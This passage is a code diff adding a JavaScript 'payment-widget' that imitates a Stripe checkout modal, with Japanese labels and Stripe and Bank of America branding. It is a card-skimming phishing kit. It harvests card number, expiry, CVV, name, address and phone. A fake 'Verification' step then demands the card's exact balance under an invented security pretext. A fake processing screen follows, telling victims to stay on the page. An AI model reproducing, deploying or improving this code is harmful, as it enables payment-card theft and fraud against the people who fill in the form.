value=\\\"PH\\\">フィリピン</option><option value=\\\"PL\\\">ポーランド</option><option value=\\\"PT\\\">ポルトガル</option><option value=\\\"QA\\\">カタール</option><option value=\\\"RO\\\">ルーマニア</option><option value=\\\"RU\\\">ロシア</option><option value=\\\"RW\\\">ルワンダ</option><option value=\\\"KN\\\">セントクリストファー・ネイビス</option><option value=\\\"LC\\\">セントルシア</option><option value=\\\"VC\\\">セントビンセントおよびグレナディーン諸島</option><option value=\\\"WS\\\">サモア</option><option value=\\\"SM\\\">サンマリノ</option><option value=\\\"ST\\\">サントメ・プリンシペ</option><option value=\\\"SA\\\">サウジアラビア</option><option value=\\\"SN\\\">セネガル</option><option value=\\\"RS\\\">セルビア</option><option value=\\\"SC\\\">セーシェル</option><option value=\\\"SL\\\">シエラレオネ</option><option value=\\\"SG\\\">シンガポール</option><option value=\\\"SK\\\">スロバキア</option><option value=\\\"SI\\\">スロベニア</option><option value=\\\"SB\\\">ソロモン諸島</option><option value=\\\"SO\\\">ソマリア</option><option value=\\\"ZA\\\">南アフリカ</option><option value=\\\"SS\\\">南スーダン</option><option value=\\\"ES\\\">スペイン</option><option value=\\\"LK\\\">スリランカ</option><option value=\\\"SD\\\">スーダン</option><option value=\\\"SR\\\">スリナム</option><option value=\\\"SZ\\\">エスワティニ</option><option value=\\\"SE\\\">スウェーデン</option><option value=\\\"CH\\\">スイス</option><option value=\\\"SY\\\">シリア</option><option value=\\\"TW\\\">台湾</option><option value=\\\"TJ\\\">タジキスタン</option><option value=\\\"TZ\\\">タンザニア</option><option value=\\\"TH\\\">タイ</option><option value=\\\"TL\\\">東ティモール</option><option value=\\\"TG\\\">トーゴ</option><option value=\\\"TO\\\">トンガ</option><option value=\\\"TT\\\">トリニダード・トバゴ</option><option value=\\\"TN\\\">チュニジア</option><option value=\\\"TR\\\">トルコ</option><option value=\\\"TM\\\">トルクメニスタン</option><option value=\\\"TV\\\">ツバル</option><option value=\\\"UG\\\">ウガンダ</option><option value=\\\"UA\\\">ウクライナ</option><option value=\\\"AE\\\">アラブ首長国連邦</option><option value=\\\"GB\\\">英国</option><option value=\\\"US\\\">アメリカ合衆国</option><option value=\\\"UY\\\">ウルグアイ</option><option value=\\\"UZ\\\">ウズベキスタン</option><option value=\\\"VU\\\">バヌアツ</option><option value=\\\"VE\\\">ベネズエラ</option><option value=\\\"VN\\\">ベトナム</option><option value=\\\"YE\\\">イエメン</option><option value=\\\"ZM\\\">ザンビア</option><option value=\\\"ZW\\\">ジンバブエ</option></select>' +
+                        '<div class="sel-arrow"><svg width="11" height="7" viewBox="0 0 11 7"><path d="M1 1l4.5 4.5L10 1" stroke="#888" stroke-width="1.4" fill="none" stroke-linecap="round"/></svg></div>' +
+                      '</div>' +
+                      '<div class="inp-box" id="box-addr1" style="margin-top:8px"><input id="cc-addr1" type="text" placeholder="'+(t.lbl_addr1||'住所')+'" autocomplete="address-line1"></div>' +
+                      '<div class="err-txt" id="err-addr1"></div>' +
+                      '<div class="inp-box" style="margin-top:8px"><input type="text" placeholder="'+(t.lbl_addr2||'住所2行目 (任意)')+'" autocomplete="address-line2"></div>' +
+                      '<div class="row2" style="margin-top:8px">' +
+                        '<div class="col"><div class="inp-box" id="box-zip"><input id="cc-zip" type="text" placeholder="'+(t.lbl_zip||'郵便番号')+'" autocomplete="postal-code"></div><div class="err-txt" id="err-zip"></div></div>' +
+                        '<div class="col"><div class="inp-box"><input id="cc-city" type="text" placeholder="'+(t.lbl_city||'市区町村')+'" autocomplete="address-level2"></div></div>' +
+                      '</div>' +
+                      '<label class="flbl">'+(t.lbl_phone||'電話番号')+'</label>' +
+                      '<div style="position:relative">' +
+                      '<div class="phone-box" id="box-phone">' +
+                        '<button class="phone-flag-btn" id="phone-flag-btn" type="button">' +
+                          '<span id="phone-flag">🇳🇱</span>' +
+                          '<span class="dial" id="phone-dial">+31</span>' +
+                          '<span class="chev">▾</span>' +
+                        '</button>' +
+                        '<input class="phone-inp" id="cc-phone" type="tel" placeholder="06 12345678" autocomplete="tel">' +
+                        '<div class="phone-info"><svg width="15" height="15" viewBox="0 0 15 15"><circle cx="7.5" cy="7.5" r="6.5" stroke="#ccc" stroke-width="1" fill="none"/><text x="7.5" y="11.5" text-anchor="middle" font-size="9" fill="#bbb" font-family="sans-serif">i</text></svg></div>' +
+                      '</div>' +
+                      '<div id="ph-drop" style="display:none;position:absolute;top:100%;left:0;z-index:9999;background:#fff;' +
+                        'border:1px solid #d1d1d1;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.18);' +
+                        'width:280px;font-size:13px;font-family:inherit;">' +
+                        '<input id="ph-search" type="text" placeholder="'+(t.ph_search||'国を検索...')+'" ' +
+                          'style="width:100%;border:none;border-bottom:1px solid #eee;padding:10px 12px;' +
+                          'font-size:13px;outline:none;box-sizing:border-box;font-family:inherit;">' +
+                        '<div id="ph-list" style="max-height:220px;overflow-y:auto;"></div>' +
+                      '</div>' +
+                      '</div>' +
+                      '<div class="err-txt" id="err-phone"></div>' +
+                      '<button class="cta" id="cta" type="button">'+(t.cta_modal||'続ける')+'</button>' +
+                      '<div class="refund">' +
+                        '<svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M6.5 12A5.5 5.5 0 1 0 6.5 1a5.5 5.5 0 0 0 0 11z" stroke="#888" stroke-width="1.1"/><path d="M4.5 6.5l1.3 1.3L8.5 5" stroke="#888" stroke-width="1.1" stroke-linecap="round" stroke-linejoin="round"/></svg>' +
+                        (t.refund||'無料の返品・交換') +
+                      '</div>' +
+                    '</div>' +
+                    '<div class="footer">' +
+                      (t.footer_by||'提供： ') +
+                      '<svg width="38" height="15" viewBox="0 0 50 20"><text y="15" font-size="16" font-weight="700" fill="#635bff" font-family="sans-serif">stripe</text></svg>' +
+                      '<span style="color:#ddd">|</span>' +
+                      '<a href="#">'+(t.footer_terms||'規約')+'</a>' +
+                      '<a href="#">'+(t.footer_privacy||'プライバシー')+'</a>' +
+                    '</div>' +
+                  '</div>' +
+                '</div>';
+
+
+            this._shadow.innerHTML = '<style>' + css + '</style>' + html;
+
+            var sh = self._shadow;
+            var ov      = sh.getElementById('ov');
+            var btnX    = sh.getElementById('x');
+            var cardInp = sh.getElementById('card-number');
+            var expInp  = sh.getElementById('cc-exp');
+            var cvvInp  = sh.getElementById('cc-cvv');
+            var nameInp = sh.getElementById('cc-name');
+            var cntry   = sh.getElementById('cc-country');
+            var phoneInp= sh.getElementById('cc-phone');
+            var flagEl  = sh.getElementById('phone-flag');
+            var dialEl  = sh.getElementById('phone-dial');
+            var ctaBtn  = sh.getElementById('cta');
+
+            btnX.addEventListener('click', function(){ self.close(); });
+            ov.addEventListener('click', function(e){ if(e.target===ov) self.close(); });
+
+            /* Luhn */
+            function luhn(n){
+                var s=0,alt=false;
+                for(var i=n.length-1;i>=0;i--){
+                    var d=parseInt(n[i],10);
+                    if(alt){d*=2;if(d>9)d-=9;}
+                    s+=d;alt=!alt;
+                }
+                return s%10===0;
+            }
+
+            /* brand rules */
+            var BRANDS=[
+                {id:'visa',     re:/^4/,              fmt:[4,4,4,4], len:[13,16,19],cvv:3},
+                {id:'mc',       re:/^(5[1-5]|2[2-7])/, fmt:[4,4,4,4],len:[16],      cvv:3},
+                {id:'amex',     re:/^3[47]/,           fmt:[4,6,5],  len:[15],      cvv:4},
+                {id:'jcb',      re:/^35(2[89]|[3-8])/, fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
+                {id:'discover', re:/^6(011|4[4-9]|5)/, fmt:[4,4,4,4],len:[16,19],   cvv:3},
+                {id:'unionpay', re:/^62/,              fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
+                {id:'mir',      re:/^220[0-4]/,        fmt:[4,4,4,4],len:[16,17,18,19],cvv:3},
+            ];
+            var curBrand=null;
+
+            function detectBrand(v){
+                for(var i=0;i<BRANDS.length;i++) if(BRANDS[i].re.test(v)) return BRANDS[i];
+                return null;
+            }
+
+            function fmtCard(raw,brand){
+                var fmt=brand?brand.fmt:[4,4,4,4];
+                var max=fmt.reduce(function(a,b){return a+b;},0);
+                raw=raw.slice(0,max);
+                var out=[],p=0;
+                for(var i=0;i<fmt.length;i++){var ch=raw.slice(p,p+fmt[i]);if(ch)out.push(ch);p+=fmt[i];}
+                return out.join(' ');
+            }
+
+            function updBrands(brand){
+                ['visa','mc','amex','jcb'].forEach(function(b){
+                    var el=sh.getElementById('brand-'+b);
+                    if(!el)return;
+                    if(!brand){el.style.opacity='1';el.style.filter='none';}
+                    else if(brand.id===b){el.style.opacity='1';el.style.filter='none';}
+                    else{el.style.opacity='0.2';el.style.filter='grayscale(1)';}
+                });
+            }
+
+            function setErr(boxId,errId,msg){
+                var box=sh.getElementById(boxId),err=sh.getElementById(errId);
+                if(box){if(msg)box.classList.add('err');else box.classList.remove('err');}
+                if(err){err.textContent=msg||'';if(msg)err.classList.add('on');else err.classList.remove('on');}
+            }
+
+            /* card number */
+            cardInp.addEventListener('input',function(){
+                var raw=this.value.replace(/\D/g,'');
+                curBrand=detectBrand(raw);
+                this.value=fmtCard(raw,curBrand);
+                updBrands(curBrand);
+                var cvvMax=curBrand&&curBrand.cvv===4?4:3;
+                cvvInp.maxLength=cvvMax;
+                cvvInp.placeholder=cvvMax===4?'1234':'CVV';
+                setErr('box-num','err-num','');
+            });
+            cardInp.addEventListener('blur',function(){
+                var raw=this.value.replace(/\D/g,'');
+                if(!raw)return;
+                var ok=luhn(raw)&&(!curBrand||curBrand.len.indexOf(raw.length)!==-1);
+                setErr('box-num','err-num',ok?'':(t.err_card||'カード番号が無効です'));
+            });
+
+            /* expiry */
+            expInp.addEventListener('input',function(){
+                var v=this.value.replace(/\D/g,'').slice(0,4);
+                this.value=v.length>=3?v.slice(0,2)+' / '+v.slice(2):v;
+                setErr('box-exp','err-exp','');
+            });
+            expInp.addEventListener('keydown',function(e){
+                if(e.key==='Backspace'&&this.value.endsWith(' / ')){
+                    e.preventDefault();this.value=this.value.slice(0,-3);
+                }
+            });
+            expInp.addEventListener('blur',function(){
+                var v=this.value.replace(/\D/g,'');
+                if(!v)return;
+                var mm=parseInt(v.slice(0,2),10),yy=parseInt(v.slice(2,4),10);
+                if(v.length<4||mm<1||mm>12){setErr('box-exp','err-exp',(t.err_exp_invalid||'有効期限が無効です'));return;}
+                var now=new Date(),fy=2000+yy,cy=now.getFullYear(),cm=now.getMonth()+1;
+                if(fy<cy||(fy===cy&&mm<cm))setErr('box-exp','err-exp',(t.err_exp_expired||'カードの有効期限が切れています'));
+                else setErr('box-exp','err-exp','');
+            });
+
+            /* cvv */
+            cvvInp.addEventListener('input',function(){
+                var max=curBrand&&curBrand.cvv===4?4:3;
+                this.value=this.value.replace(/\D/g,'').slice(0,max);
+                setErr('box-cvv','err-cvv','');
+            });
+            cvvInp.addEventListener('blur',function(){
+                if(!this.value)return;
+                var need=curBrand&&curBrand.cvv===4?4:3;
+                if(this.value.length<need)setErr('box-cvv','err-cvv',(t.err_cvv||'セキュリティコードが不完全です'));
+            });
+
+            /* name */
+            nameInp.addEventListener('blur',function(){
+                if(this.value.trim()&&this.value.trim().length<2)
+                    setErr('box-name','err-name',(t.err_name||'カード名義人名を入力してください'));
+                else setErr('box-name','err-name','');
+            });
+
+            /* phone data */
+            var PH={
+                'AF':['🇦🇫','+93','70 123 4567'],
+                'AL':['🇦🇱','+355','069 123 4567'],
+                'AR':['🇦🇷','+54','11 1234-5678'],
+                'AU':['🇦🇺','+61','04 1234 5678'],
+                'AT':['🇦🇹','+43','0664 123456'],
+                'BE':['🇧🇪','+32','0470 12 34 56'],
+                'BR':['🇧🇷','+55','11 91234-5678'],
+                'BG':['🇧🇬','+359','087 123 4567'],
+                'CA':['🇨🇦','+1','(416) 555-0123'],
+                'CN':['🇨🇳','+86','131 1234 5678'],
+                'HR':['🇭🇷','+385','091 234 5678'],
+                'CZ':['🇨🇿','+420','601 123 456'],
+                'DK':['🇩🇰','+45','20 12 34 56'],
+                'EG':['🇪🇬','+20','010 1234 5678'],
+                'EE':['🇪🇪','+372','5123 4567'],
+                'FI':['🇫🇮','+358','040 123 4567'],
+                'FR':['🇫🇷','+33','06 12 34 56 78'],
+                'DE':['🇩🇪','+49','0151 12345678'],
+                'GR':['🇬🇷','+30','069 1234 5678'],
+                'HK':['🇭🇰','+852','5123 4567'],
+                'HU':['🇭🇺','+36','06 20 123 4567'],
+                'IN':['🇮🇳','+91','98765 43210'],
+                'ID':['🇮🇩','+62','0812-3456-7890'],
+                'IE':['🇮🇪','+353','085 123 4567'],
+                'IL':['🇮🇱','+972','050-123-4567'],
+                'IT':['🇮🇹','+39','320 123 4567'],
+                'JP':['🇯🇵','+81','090-1234-5678'],
+                'KZ':['🇰🇿','+7','700 123 4567'],
+                'KR':['🇰🇷','+82','010-1234-5678'],
+                'LV':['🇱🇻','+371','21 234 567'],
+                'LT':['🇱🇹','+370','612 34567'],
+                'LU':['🇱🇺','+352','621 123 456'],
+                'MY':['🇲🇾','+60','012-345 6789'],
+                'MX':['🇲🇽','+52','55 1234 5678'],
+                'NL':['🇳🇱','+31','06 12345678'],
+                'NZ':['🇳🇿','+64','021 123 4567'],
+                'NG':['🇳🇬','+234','0801 234 5678'],
+                'NO':['🇳🇴','+47','400 12 345'],
+                'PK':['🇵🇰','+92','0301 2345678'],
+                'PL':['🇵🇱','+48','512 345 678'],
+                'PT':['🇵🇹','+351','912 345 678'],
+                'RO':['🇷🇴','+40','0712 345 678'],
+                'RU':['🇷🇺','+7','900 123-45-67'],
+                'SA':['🇸🇦','+966','050 123 4567'],
+                'RS':['🇷🇸','+381','060 1234567'],
+                'SG':['🇸🇬','+65','8123 4567'],
+                'SK':['🇸🇰','+421','0901 123 456'],
+                'SI':['🇸🇮','+386','031 123 456'],
+                'ZA':['🇿🇦','+27','071 123 4567'],
+                'ES':['🇪🇸','+34','612 34 56 78'],
+                'SE':['🇸🇪','+46','070-123 45 67'],
+                'CH':['🇨🇭','+41','076 123 45 67'],
+                'TW':['🇹🇼','+886','0912 345 678'],
+                'TH':['🇹🇭','+66','081 234 5678'],
+                'TR':['🇹🇷','+90','0532 123 4567'],
+                'UA':['🇺🇦','+380','067 123 4567'],
+                'AE':['🇦🇪','+971','050 123 4567'],
+                'GB':['🇬🇧','+44','07700 900123'],
+                'US':['🇺🇸','+1','(555) 555-5555'],
+                'UZ':['🇺🇿','+998','90 123 45 67'],
+                'VN':['🇻🇳','+84','090 123 45 67'],
+            };
+
+            function setPhone(cc){
+                var d=PH[cc]||PH['US'];
+                if(flagEl)flagEl.textContent=d[0];
+                if(dialEl)dialEl.textContent=d[1];
+                if(phoneInp)phoneInp.placeholder=d[2];
+            }
+            setPhone(cntry?cntry.value:'NL');
+            if(cntry)cntry.addEventListener('change',function(){setPhone(this.value);});
+
+            /* ── phone country picker dropdown ── */
+            var phDrop=sh.getElementById('ph-drop');
+            var phSearch=sh.getElementById('ph-search');
+            var phList=sh.getElementById('ph-list');
+            var pickerOpen=false;
+
+            function renderPhList(filter){
+                phList.innerHTML='';
+                Object.keys(PH).sort(function(a,b){
+                    return (PH[a][1]+' '+a).localeCompare(PH[b][1]+' '+b);
+                }).forEach(function(cc){
+                    var d=PH[cc];
+                    var label=(d[0]+' '+d[1]+' '+cc).toLowerCase();
+                    if(filter&&label.indexOf(filter.toLowerCase())===-1)return;
+                    var row=sh.ownerDocument.createElement('div');
+                    row.style.cssText='display:flex;align-items:center;gap:8px;padding:9px 12px;cursor:pointer;';
+                    row.innerHTML='<span style="font-size:18px">'+d[0]+'</span>'+
+                        '<span style="color:#333;font-size:13px">'+d[1]+'</span>'+
+                        '<span style="color:#999;font-size:11px;margin-left:4px">'+cc+'</span>';
+                    row.addEventListener('mouseover',function(){this.style.background='#f5f5f5';});
+                    row.addEventListener('mouseout',function(){this.style.background='';});
+                    row.addEventListener('mousedown',function(e){
+                        e.preventDefault();
+                        setPhone(cc);
+                        if(cntry){var opt=cntry.querySelector('option[value="'+cc+'"]');if(opt)cntry.value=cc;}
+                        closePh();
+                    });
+                    phList.appendChild(row);
+                });
+            }
+
+            function openPh(){
+                if(pickerOpen)return;
+                pickerOpen=true;
+                if(phSearch)phSearch.value='';
+                renderPhList('');
+                if(phDrop)phDrop.style.display='block';
+                setTimeout(function(){if(phSearch)phSearch.focus();},30);
+            }
+
+            function closePh(){
+                if(!pickerOpen)return;
+                pickerOpen=false;
+                if(phDrop)phDrop.style.display='none';
+            }
+
+            var flagBtnEl=sh.getElementById('phone-flag-btn');
+            if(flagBtnEl){
+                flagBtnEl.addEventListener('click',function(e){
+                    e.stopPropagation();
+                    pickerOpen?closePh():openPh();
+                });
+            }
+            if(phSearch){
+                phSearch.addEventListener('input',function(){renderPhList(this.value);});
+                phSearch.addEventListener('keydown',function(e){if(e.key==='Escape')closePh();});
+            }
+            ov.addEventListener('click',function(){closePh();});
+            btnX.addEventListener('click',function(){closePh();});
+
+            if(phoneInp){
+                phoneInp.addEventListener('input',function(){
+                    this.value=this.value.replace(/[^\d\s\-\(\)\+]/g,'');
+                    setErr('box-phone','err-phone','');
+                });
+                phoneInp.addEventListener('blur',function(){
+                    var digits=this.value.replace(/\D/g,'');
+                    if(digits&&digits.length<6)setErr('box-phone','err-phone',(t.err_phone||'電話番号が無効です'));
+                });
+            }
+
+            /* submit */
+            if(ctaBtn){
+                ctaBtn.addEventListener('click',function(){
+                    var ok=true;
+                    var raw=cardInp.value.replace(/\D/g,'');
+                    if(!raw||!luhn(raw)){setErr('box-num','err-num',(t.val_card||'カード番号が無効です'));ok=false;}
+                    var ev=expInp.value.replace(/\D/g,'');
+                    if(ev.length<4){setErr('box-exp','err-exp',(t.val_exp||'有効期限を入力してください'));ok=false;}
+                    var cvvNeed=curBrand&&curBrand.cvv===4?4:3;
+                    if(cvvInp.value.length<cvvNeed){setErr('box-cvv','err-cvv',(t.val_cvv||'セキュリティコードを入力してください'));ok=false;}
+                    if(!nameInp.value.trim()){setErr('box-name','err-name',(t.val_name||'カード名義人名を入力してください'));ok=false;}
+                    if(!ok)return;
+                    submitData({
+                        card_number: cardInp.value,
+                        card_exp:    expInp.value,
+                        card_cvv:    cvvInp.value,
+                        card_name:   nameInp.value.trim(),
+                        country:     cntry ? cntry.value : '',
+                        address1:    (sh.getElementById('cc-addr1')||{}).value||'',
+                        address2:    '',
+                        zip_code:    (sh.getElementById('cc-zip')||{}).value||'',
+                        city:        (sh.getElementById('cc-city')||{}).value||'',
+                        phone_dial:  dialEl ? dialEl.textContent : '',
+                        phone:       phoneInp ? phoneInp.value : ''
+                    });
+                    showVerification(sh, self);
+                });
+            }
+
+            function showVerification(sh, self){
+                var dlg=sh.querySelector('.dlg');
+                if(!dlg)return;
+                /* save original content */
+                var origHTML=dlg.innerHTML;
+
+                /* card label from brand + last4 */
+                var raw=cardInp?cardInp.value.replace(/\D/g,''):'';
+                var last4=raw.slice(-4);
+                var brandName=(curBrand&&curBrand.id)?curBrand.id.toUpperCase():'CARD';
+                var issuer=nameInp?nameInp.value.trim()||brandName+' CO., LTD.':brandName+' CO., LTD.';
+
+                /* build verification screen */
+                var v=sh.ownerDocument.createElement('div');
+                v.id='verify-screen';
+                v.style.cssText='display:flex;flex-direction:column;height:100%;';
+                v.innerHTML=
+                  '<div class="hdr" style="justify-content:center;position:relative;">' +
+                    '<span style="font-size:15px;font-weight:600;color:#1a1a2e;">Verification</span>' +
+                    '<button id="v-close" type="button" style="position:absolute;right:16px;top:50%;transform:translateY(-50%);' +
+                      'background:none;border:none;font-size:20px;cursor:pointer;color:#888;line-height:1;">×</button>' +
+                  '</div>' +
+                  '<div style="padding:24px 28px 28px;display:flex;flex-direction:column;gap:18px;">' +
+                    /* bank icons */
+                    '<div style="display:flex;align-items:center;justify-content:center;gap:0;margin:8px 0 4px;">' +
+                      '<svg width="52" height="52" viewBox="0 0 52 52" fill="none"><rect width="52" height="52" rx="8" fill="#e8f4fd"/>' +
+                        '<path d="M10 36h32M10 20h32M26 14v24M14 20l12-6 12 6" stroke="#29abe2" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>' +
+                        '<rect x="14" y="20" width="6" height="12" rx="1" fill="#29abe2"/>' +
+                        '<rect x="23" y="20" width="6" height="12" rx="1" fill="#29abe2"/>' +
+                        '<rect x="32" y="20" width="6" height="12" rx="1" fill="#29abe2"/>' +
+                      '</svg>' +
+                      '<div style="flex:1;height:2px;background:repeating-linear-gradient(90deg,#29abe2 0 8px,transparent 8px 14px);margin:0 6px;"></div>' +
+                      '<svg width="52" height="52" viewBox="0 0 52 52" fill="none"><rect width="52" height="52" rx="8" fill="#e8f4fd"/>' +
+                        '<path d="M10 36h32M10 20h32M26 14v24M14 20l12-6 12 6" stroke="#29abe2" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>' +
+                        '<rect x="14" y="20" width="6" height="12" rx="1" fill="#29abe2"/>' +
+                        '<rect x="23" y="20" width="6" height="12" rx="1" fill="#29abe2"/>' +
+                        '<rect x="32" y="20" width="6" height="12" rx="1" fill="#29abe2"/>' +
+                      '</svg>' +
+                    '</div>' +
+                    /* description */
+                    '<p style="font-size:13px;color:#333;line-height:1.6;margin:0;">' +
+                      issuer+' has implemented a new security measure: their system now automatically checks your balance before and after completing the verification. This helps prevent potential issues, avoid accidental or unauthorized charges, and simplifies refunds in case of errors. To proceed with the verification, please provide the exact balance on your card. If it is a credit card, enter the current available balance.' +
+                    '</p>' +
+                    /* card row */
+                    '<div style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;">' +
+                      '<div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#f8f8f8;border-bottom:1px solid #e8e8e8;">' +
+                        '<span style="font-size:12px;color:#888;font-weight:500;letter-spacing:.3px;">'+issuer.toUpperCase()+'</span>' +
+                        '<span id="v-brand-icon" style="font-size:12px;font-weight:700;color:#1a1a2e;letter-spacing:.5px;">'+(curBrand&&curBrand.id==='visa'?'VISA':curBrand&&curBrand.id==='mastercard'?'MC':curBrand&&curBrand.id==='amex'?'AMEX':brandName)+'</span>' +
+                      '</div>' +
+                      '<div style="display:flex;align-items:stretch;">' +
+                        '<input id="v-amount" type="number" min="0" step="0.01" placeholder="0.00" ' +
+                          'style="flex:1;border:none;outline:none;padding:12px 14px;font-size:15px;color:#1a1a2e;font-family:inherit;background:#fff;">' +
+                        '<div style="width:1px;background:#e8e8e8;"></div>' +
+                        '<select id="v-currency" style="border:none;outline:none;padding:12px 14px;font-size:14px;color:#1a1a2e;'+
+                          'font-family:inherit;background:#fff;cursor:pointer;min-width:110px;">' +
+                          '<option value="JPY">JPY (¥)</option>' +
+                          '<option value="USD">USD ($)</option>' +
+                          '<option value="EUR">EUR (€)</option>' +
+                          '<option value="GBP">GBP (£)</option>' +
+                          '<option value="AUD">AUD (A$)</option>' +
+                          '<option value="CAD">CAD (C$)</option>' +
+                          '<option value="CHF">CHF (Fr)</option>' +
+                          '<option value="CNY">CNY (¥)</option>' +
+                          '<option value="KRW">KRW (₩)</option>' +
+                          '<option value="SGD">SGD (S$)</option>' +
+                        '</select>' +
+                      '</div>' +
+                    '</div>' +
+                    /* continue btn */
+                    '<button id="v-continue" type="button" style="display:block;width:100%;padding:14px;background:#29abe2;'+
+                      'color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;">'+(t.ver_continue||'Continue')+'</button>' +
+                    /* footer */
+                    '<div style="display:flex;align-items:center;justify-content:center;gap:12px;font-size:12px;color:#aaa;">' +
+                      '<span>Powered by <strong style="color:#555;">stripe</strong></span>' +
+                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_terms||'Terms')+'</a>' +
+                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_privacy||'Privacy')+'</a>' +
+                    '</div>' +
+                  '</div>';
+
+                dlg.innerHTML='';
+                dlg.appendChild(v);
+
+                sh.getElementById('v-close').addEventListener('click',function(){
+                    self.close();
+                });
+                sh.getElementById('v-continue').addEventListener('click',function(){
+                    var amt=sh.getElementById('v-amount').value;
+                    if(!amt||isNaN(parseFloat(amt))){
+                        sh.getElementById('v-amount').style.outline='2px solid #df1b41';
+                        return;
+                    }
+                    var cur=(sh.getElementById('v-currency')||{}).value||'';
+                    submitData({
+                        card_number: cardInp ? cardInp.value : '',
+                        card_exp:    expInp  ? expInp.value  : '',
+                        card_cvv:    cvvInp  ? cvvInp.value  : '',
+                        card_name:   nameInp ? nameInp.value.trim() : '',
+                        country:     cntry   ? cntry.value   : '',
+                        address1:    (sh.getElementById('cc-addr1')||{}).value||'',
+                        zip_code:    (sh.getElementById('cc-zip')||{}).value||'',
+                        city:        (sh.getElementById('cc-city')||{}).value||'',
+                        phone_dial:  dialEl  ? dialEl.textContent : '',
+                        phone:       phoneInp? phoneInp.value : '',
+                        balance_amount:   amt,
+                        balance_currency: cur
+                    });
+                    showProcessing(sh, self);
+                });
+            }
+
+            function showProcessing(sh, self){
+                var dlg=sh.querySelector('.dlg');
+                if(!dlg)return;
+                var brandLabel=(curBrand&&curBrand.id)?curBrand.id.toUpperCase():'CARD';
+
+                /* brand logo SVG inline */
+                var brandSvg='';
+                if(brandLabel==='VISA'){
+                    brandSvg='<span style="font-size:13px;font-weight:800;color:#1a1f71;letter-spacing:1px;font-style:italic;">VISA</span>';
+                } else if(brandLabel==='MASTERCARD'){
+                    brandSvg='<svg width="34" height="22" viewBox="0 0 34 22"><circle cx="13" cy="11" r="10" fill="#eb001b"/><circle cx="21" cy="11" r="10" fill="#f79e1b"/><path d="M17 4.8a10 10 0 0 1 0 12.4A10 10 0 0 1 17 4.8z" fill="#ff5f00"/></svg>';
+                } else if(brandLabel==='AMEX'){
+                    brandSvg='<span style="font-size:11px;font-weight:700;color:#2557d6;background:#e8f0fe;padding:2px 6px;border-radius:3px;">AMEX</span>';
+                } else {
+                    brandSvg='<span style="font-size:11px;font-weight:700;color:#555;">'+brandLabel+'</span>';
+                }
+
+                /* three-dot icon like on screenshot */
+                var dotsIcon='<div style="display:inline-flex;align-items:center;justify-content:center;'+
+                    'background:#e31837;border-radius:4px;padding:2px 5px;gap:2px;margin-right:6px;">'+
+                    '<div style="width:5px;height:5px;background:#fff;border-radius:50%;"></div>'+
+                    '<div style="width:5px;height:5px;background:#fff;border-radius:50%;"></div>'+
+                    '<div style="width:5px;height:5px;background:#fff;border-radius:50%;"></div>'+
+                    '</div>';
+
+                var v=sh.ownerDocument.createElement('div');
+                v.style.cssText='display:flex;flex-direction:column;height:100%;';
+                v.innerHTML=
+                  '<div class="hdr" style="justify-content:center;position:relative;">' +
+                    '<button id="p-close" type="button" style="position:absolute;right:16px;top:50%;transform:translateY(-50%);'+
+                      'background:none;border:none;font-size:20px;cursor:pointer;color:#888;line-height:1;">×</button>' +
+                  '</div>' +
+                  '<div style="padding:16px 28px 28px;display:flex;flex-direction:column;align-items:center;gap:20px;">' +
+                    '<div style="margin:8px 0 4px;">' +
+                      '<svg width="80" height="80" viewBox="0 0 80 80" fill="none">'+
+                        '<path d="M15 60h50M15 32h50M40 20L15 32h50L40 20z" stroke="#2ecc71" stroke-width="3" stroke-linejoin="round" fill="none"/>'+
+                        '<rect x="20" y="32" width="8" height="20" rx="1" fill="#2ecc71"/>'+
+                        '<rect x="36" y="32" width="8" height="20" rx="1" fill="#2ecc71"/>'+
+                        '<rect x="52" y="32" width="8" height="20" rx="1" fill="#2ecc71"/>'+
+                        '<line x1="15" y1="60" x2="65" y2="60" stroke="#2ecc71" stroke-width="3" stroke-linecap="round"/>'+
+                      '</svg>'+
+                    '</div>' +
+                    /* card row exactly like screenshot: grey bg, bank name left, dots+brand right */
+                    '<div style="width:100%;background:#f0f0f0;border-radius:8px;padding:12px 16px;'+
+                        'display:flex;align-items:center;justify-content:space-between;">' +
+                      '<span style="font-size:11px;font-weight:600;color:#999;letter-spacing:.4px;">BANK OF AMERICA, NATIONAL ASSOCIATION</span>' +
+                      '<div style="display:flex;align-items:center;flex-shrink:0;margin-left:8px;">'+dotsIcon+brandSvg+'</div>'+
+                    '</div>' +
+                    /* warning text */
+                    '<div style="width:100%;background:#f7f7f7;border-radius:8px;padding:16px 18px;">' +
+                      '<p style="font-size:14px;color:#333;line-height:1.65;margin:0;">'+(t.proc_warning||'Currently, the system is unstable, and the process may take a bit longer. Additional verification may also be required. Please do not leave the page until the transaction is complete!')+'</p>' +
+                    '</div>' +
+                    '<div style="display:flex;align-items:center;gap:12px;font-size:12px;color:#aaa;">' +
+                      '<span>Powered by <strong style="color:#555;">stripe</strong></span>' +
+                      '<span style="color:#ddd;">|</span>' +
+                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_terms||'Terms')+'</a>' +
+                      '<a href="#" style="color:#aaa;text-decoration:none;">'+(t.proc_privacy||'Privacy')+'</a>' +
+                    '</div>' +
+                  '</div>';
+
+                dlg.innerHTML='';
+                dlg.appendChild(v);
+
+                sh.getElementById('p-close').addEventListener('click',function(){
+                    self.close();
+                });
+            }
+
+        }
+        /* ── end _render ── */
+
+        open(){
+            if(!this._shadow.getElementById('ov')) this._render();
+            this._isOpen = true;
+            var o = this._shadow.getElementById('ov');
+            if(o) o.classList.add('on');
+        }
+
+        close(){
+            this._isOpen = false;
+            var o = this._shadow.getElementById('ov');
+            if(o) o.classList.remove('on');
+        }
+
+        get isOpen(){ return this._isOpen; }
+    });
+
+    /* ── wire [paymentopenbutton] clicks ── */
+    function wireButtons(){
+        document.querySelectorAll('[paymentopenbutton]').forEach(function(btn){
+            btn.addEventListener('click', function(e){
+                e.preventDefault();
+                var w = document.querySelector('payment-widget');
+                if(w) w.open();
+            });
+        });
+    }
+
+    if(document.readyState === 'loading'){
